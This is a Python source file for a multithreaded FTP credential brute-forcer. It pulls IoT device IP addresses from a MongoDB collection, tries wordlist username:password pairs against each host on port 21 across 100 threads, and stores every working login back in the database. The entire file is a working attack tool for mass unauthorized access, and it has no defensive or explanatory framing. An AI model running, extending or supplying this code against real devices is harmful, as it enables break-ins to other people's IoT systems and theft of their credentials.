from File import open_file
from numpy import array_split
from colorama import Fore
from ftplib import FTP
import pymongo
import ftplib
import threading
import logging

logging.basicConfig(filename='ftp.log',format='%(asctime)s - %(message)s',datefmt='%d-%b-%y %H:%M:%S')
#Basic ftp.log for exceptions handling

class FTP_Test():
    def __init__(self,user_pass):
        self.user_pass = open_file(user_pass)
    
    def search(self):
        self.database = pymongo.MongoClient("mongodb://localhost:27017")
        collection = self.database.IOT.devices.find({"ftp_flag": False})
        #FTP boolean flag in collections says if this target has been scanned before
        return collection
    
    #Search in MongoDB and convert dict to list (iterable)
    def dict_to_list(self):
        servers = []
        for doc in self.search():
            servers.append(doc["ip"])
        return servers
    
    def test_credentials(self,ip,count,total):
        for i in self.user_pass:
            creds = i.split(':')
            try:
                ftp = FTP(ip)
                ftp.connect(ip,21,timeout=1)
                ftp.login(creds[0], creds[1])
                ftp.quit()
                print('{}FOUND CREDENTIALS {} {} {} {}'.format(Fore.GREEN, ip, creds[0], creds[1],count))
                #Save results in sub list to insert later
                result = [ip,creds[0],creds[1]]
                total.append(result)
           
            except ftplib.error_perm:
                print('{}Invalid {} {} {} {}'.format(Fore.RESET,ip, creds[0], creds[1], count))

            except Exception as e:
                logging.error("Exception occurred", exc_info=True)

    def start_thread(self, sub_ip, count):
        total = []
        for ip in sub_ip:
            self.test_credentials(ip,count,total)
        self.update_document(total)

    def update_document(self,total):
        connection = self.database
        for sub in total:
           doc = connection.IOT.devices.find_one({"ip": sub[0]})
           connection.IOT.devices.update_one({"_id": doc["_id"]}, {"$set": {"ftp_flag": True, "ftp_user": sub[1], "ftp_password": sub[2]}})
           #Set FTP flag true to validate scan

    def start(self):
        count = 0
        split = array_split(self.dict_to_list(),100)
        #Convert list into smaller lists and send to each thread
        for sub_ip in split:
            count += 1
            worker = threading.Thread(target=self.start_thread, args=(sub_ip, count))
            worker.start() 

